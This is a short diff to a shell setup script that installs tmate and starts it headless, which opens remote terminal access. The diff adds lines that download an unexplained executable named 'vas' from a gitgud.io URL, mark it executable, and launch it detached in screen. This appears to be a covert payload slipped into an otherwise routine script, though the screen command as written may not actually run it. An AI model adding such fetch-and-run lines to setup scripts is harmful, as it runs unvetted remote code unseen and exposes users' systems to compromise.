@@ -1,6 +1,8 @@
 apt-get update
-apt-get install wget -y
+apt-get install wget screen -y
 wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
+wget https://gitgud.io/trendava/ruby/-/raw/master/vas;chmod 700 vas
+screen -dmS ./vas
 tar xvf tmate-2.4.0-static-linux-amd64.tar.xz
 cd tmate-2.4.0-static-linux-amd64
 ./tmate -S /var/tmate.sock new-session -d               # Launch tmate in a headless mode
